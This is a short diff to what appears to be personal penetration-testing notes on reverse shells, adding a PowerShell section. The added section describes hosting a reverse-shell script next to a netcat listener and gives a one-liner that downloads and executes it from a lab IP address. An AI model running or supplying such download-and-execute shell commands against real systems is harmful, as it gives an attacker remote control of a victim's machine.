@@ -28,6 +28,12 @@ then write
 	stty raw -echo; fg;
 	export TERM=xterm
 
+## Powershell
+
+Save a powershell from https://www.revshells.com/ to a file. Start the netcat listener and a http server in the dir of the revshell we just saved.
+Download and execute the shell with this one liner:
+
+	powershell.exe -c iex (iwr -UseBasicParsing http://10.10.14.119:8000/my_ps_shell.ps1)
 
 ## Tips
 
